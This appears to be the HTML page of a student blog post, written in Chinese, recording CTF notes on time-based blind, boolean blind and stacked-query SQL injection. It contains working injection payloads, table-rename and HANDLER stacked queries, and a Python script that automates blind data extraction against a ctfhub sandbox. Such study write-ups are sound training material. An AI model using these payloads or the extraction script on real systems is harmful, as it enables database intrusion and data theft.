@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="﹎ゞ没有信任的爱情">
+
+
+
+
+
+<title>布尔.时间.堆叠注入 | overnight-miss-you</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search')
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+        } else {
+            search.removeClass("mobile-search");
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data, index) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content && data.content.trim().replace(/<[^>]+>/g, "").toLowerCase() || '';
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">立刻有的博客</a></div>
+            <div class="menu navbar-right">
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/03.jpg" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="Searching" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">balap</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">立刻有的博客</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/03.jpg" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="Searching" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+                </div>
+                
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">balap</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">布尔.时间.堆叠注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">﹎ゞ没有信任的爱情</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 12, 2020&nbsp;&nbsp;22:39:04</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="菜鸡博客第七彈"><a href="#菜鸡博客第七彈" class="headerlink" title="菜鸡博客第七彈"></a>菜鸡博客第七彈</h2><p>这次接着总结常见的sql注入</p>
+<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>在不知道提示时，可以利用<code>sleep()</code>或<code>benchmark()</code>等函数让mysql执行时间变长经常与<code>if(expr1,expr2,expr3)</code>语句结合使用，通过页面的响应时间来判断条件是否正确。<code>if(expr1,expr2,expr3)</code>含义是如果<code>expr1</code>是True,则返回<code>expr2</code>,否则返回<code>expr3</code>。</p>
+<p>我们就可以在<code>expr1</code>中写入猜想，通过执行代码来判断我们的猜想是否正确。</p>
+<p>例如：输入<code>1 and if(length(database())&gt;=8,sleep(5),1)</code>执行，发现页面相应时间变长约5秒。则数据库长度大于等于8.，接着放大数字来确定数据库名长度。</p>
+<p>爆破数据库:<code>1 and if(substr(database(),1,1)=&#39;a&#39;,sleep(5),1)</code>在a处爆破：时间最长的为正确。</p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012170312840.png" alt="image-20201012170312840"></p>
+<p>​    在爆破第二个字符是把<code>(database(),1,1)</code>改为<code>(database(),1,2)</code>即可。之后以此类推。</p>
+<p>猜测数据表的个数：<code>1 and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(3),1)</code>(2处可以修改)。</p>
+<p>爆破表名：<code>1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#39;a&#39;,sleep(3),1)</code>(与上方类似)  更改<code>limit 0,1)</code>为<code>limit 1,1)</code>即可爆破第二个表。。</p>
+<p>猜测数字段数量：<code>1 and if((select count(column_name) from information_schema.columns where table_name=&#39;flag&#39;)=1,sleep(3),1)</code>(1处可以修改)。</p>
+<p>爆破字段名：<code>1 and if(ascii(substr((select column_name from information_schema.columns  where table_name=&#39;flag&#39;),1,1))=&#39;a&#39;,sleep(3),1)</code></p>
+<p>大佬爆破盲注使用的半自动脚本（大佬nb）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">urlOPEN = <span class="string">&#x27;http://challenge-80bbba4d1e9ce716.sandbox.ctfhub.com:10080/?id=&#x27;</span></span><br><span class="line">starOperatorTime = [] </span><br><span class="line">mark = <span class="string">&#x27;query_success&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_name</span>():</span></span><br><span class="line">	name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;sqcwertyuioplkjhgfdazxvbnm&#x27;</span>:</span><br><span class="line">			url = urlOPEN+<span class="string">&#x27;if(substr(database(),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> %(j,i)  //可根据题，自行修改。</span><br><span class="line">            <span class="comment"># print(url+&#x27;%23&#x27;)</span></span><br><span class="line">			r = requests.get(url)</span><br><span class="line">			<span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">				name = name+i</span><br><span class="line">				</span><br><span class="line">				print(name)</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	print(<span class="string">&#x27;database_name:&#x27;</span>,name)</span><br><span class="line">	</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line">database_name()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_name</span>():</span></span><br><span class="line">    list = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;sqcwertyuioplkjhgfdazxvbnm&#x27;</span>:</span><br><span class="line">                url = urlOPEN+<span class="string">&#x27;if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> %(k,j,i)</span><br><span class="line">			    <span class="comment"># print(url+&#x27;%23&#x27;)</span></span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name = name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        list.append(name)</span><br><span class="line">    print(<span class="string">&#x27;table_name:&#x27;</span>,list)</span><br><span class="line"></span><br><span class="line"><span class="comment">#start = time.time()</span></span><br><span class="line">table_name()</span><br><span class="line"><span class="comment">#stop = time.time()</span></span><br><span class="line"><span class="comment">#starOperatorTime.append(stop-start)</span></span><br><span class="line"><span class="comment">#print(&quot;所用的平均时间： &quot; + str(sum(starOperatorTime)/100))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">column_name</span>():</span></span><br><span class="line">    list = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3</span>): <span class="comment">#判断表里最多有4个字段</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>): <span class="comment">#判断一个 字段名最多有9个字符组成</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;sqcwertyuioplkjhgfdazxvbnm&#x27;</span>:</span><br><span class="line">                url=urlOPEN+<span class="string">&#x27;if(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot;and table_schema= database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> %(k,j,i)</span><br><span class="line">                r=requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name=name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        list.append(name)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&#x27;column_name:&#x27;</span>,list)</span><br><span class="line"></span><br><span class="line">column_name()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>): <span class="comment">#判断一个值最多有51个字符组成</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">126</span>):</span><br><span class="line">                url=urlOPEN+<span class="string">&#x27;if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))&#x27;</span> %(j,i)</span><br><span class="line">                r=requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name=name+chr(i)</span><br><span class="line">                    print(name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&#x27;value:&#x27;</span>,name)</span><br><span class="line">    </span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure>
+
+<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>与上面的时间盲注类似</p>
+<p>我这写一个代码其他的将上面的代码修改即可。思路一致。</p>
+<p>爆破数据库:<code>1 and substr(database(),1,1)=&#39;a&#39;</code></p>
+<h5 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h5><p>堆叠查询注入：堆叠查询可以执行多条SQL语句，语句之间以分号(;)隔开。而堆叠查询注入攻击就是利用此特点，在第二条语句中构造自己要执行的语句。</p>
+<p>研究了一下强网杯2019随便注，发现还是不太懂  防止忘记  在总结一下——&gt;&gt;<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105822498?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160250320419195240449315%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=160250320419195240449315&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v3~pc_rank_v2-22-105822498.first_rank_ecpm_v3_pc_rank_v2&utm_term=%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5&spm=1018.2118.3001.4187">大佬博客</a></p>
+<p>输入<code>1</code>没有回显，输入<code>1&#39;</code>，回显<img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012203938068.png" alt="image-20201012203938068"></p>
+<p>输入<code>1&#39;and1=1#</code>没有回显，尝试<code>1&#39; or 1=1#</code>有回显</p>
+<img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012210056106.png" alt="image-20201012210056106" style="zoom:80%;" />
+
+<p>判断字段数<code>1&#39;order by  2#</code>有回显<code>1&#39;order by 3#</code>没有回显。</p>
+<p>联合查询字段<code>1&#39;union select 1,2</code>回显正则过滤<img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012211153568.png" alt="image-20201012211153568"></p>
+<p>没有过滤<code>rename</code>和<code>alter</code>可以尝试堆叠注入（当然，我肯定是想不到滴)<img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/02ADE2EA.jpg" style="zoom:25%;" /></p>
+<p>接着使用堆叠判断数据库名<code>1&#39;;show databases;#</code>查看所有数据库有回显可以注入。</p>
+<img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012212111844.png" alt="image-20201012212111844" style="zoom:80%;" />
+
+<p>接着查看所有的表<code>1&#39;;show tabales;#</code>回显了所有的表。</p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012212604708.png" alt="image-20201012212604708"></p>
+<p>查看两个表里得数据<code>0&#39;;show columns from words;#</code></p>
+<img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012213207735.png" alt="image-20201012213207735" style="zoom:80%;" />
+
+<p><code>0&#39;; show columns from </code>1919810931114514<code>;#</code></p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012214238170.png" alt="image-20201012214238170"></p>
+<p>发现flag。但<code>1&#39; or 1=1#</code>只能打开words里的内容；开始使用骚操作。（肯定，这我还是想不出来嘀)<img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/02C8EA49.jpg" alt="img" style="zoom: 25%;" /></p>
+<p>把words改成随便其他的，把1919810931114514改名为words，并且把新words(原1919810931114514)里添加一列id;</p>
+<p>再把flag列改成data,====这样以后，系统默认输出的内容就是flag里的内容了。</p>
+<p>代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table words to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100);#&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">出现一条分界线表示执行成功，执行&#96;1&#39; or 1&#x3D;1#&#96;输出flag。</span><br><span class="line"></span><br><span class="line">还有两种相似方法：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>1’;HANDLER <code>1919810931114514</code> OPEN;HANDLER <code>1919810931114514</code> READ FIRST;#</p>
+<p>1’;HANDLER <code>1919810931114514</code> OPEN;HANDLER <code>1919810931114514</code> READ FIRST;HANDLER <code>1919810931114514</code> CLOSE;#</p>
+<p>```</p>
+<p><strong><code>HANDLER ... OPEN</code>语句打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句访问，该表对象未被其他会话共享，并且在会话调用<code>HANDLER ... CLOSE</code>或会话终止之前不会关闭</strong></p>
+<h4 id="！！！！这次的菜鸡博客就到这吧，我要去吃饭，睡觉，打六花了！！！"><a href="#！！！！这次的菜鸡博客就到这吧，我要去吃饭，睡觉，打六花了！！！" class="headerlink" title="！！！！这次的菜鸡博客就到这吧，我要去吃饭，睡觉，打六花了！！！"></a>！！！！这次的菜鸡博客就到这吧，我要去吃饭，睡觉，打六花了！！！</h4><p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/inhhdex.jpg" alt="inhhdex"></p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/timsdsg.gif" alt="timsdsg"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>﹎ゞ没有信任的爱情</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/10/12/jjx/">http://example.com/2020/10/12/jjx/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/10/10/8-9/">整.符.错.注入</a>
+            
+        </section>
+        
+            <section id="comments" class="comments">
+              <style>
+                .comments{margin:30px;padding:10px;background:#ddd}
+                @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#ddd}}
+              </style>
+              <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: 'AGC51zjjy9ICRLH7k5Xt42Pm-gzGzoHsz',
+      app_key: 'Pf5AC03FDS29xbJPgiAgM0Fi',
+      placeholder: '请在此输入您的留言',
+      notify: 'false',
+      verify: 'false',
+    });
+</script>
+            </section>
+        
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© ﹎ゞ没有信任的爱情 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+    <!-- Chic/layout.ejs -->
+    <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/03.jpg" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+</body>
+</html>
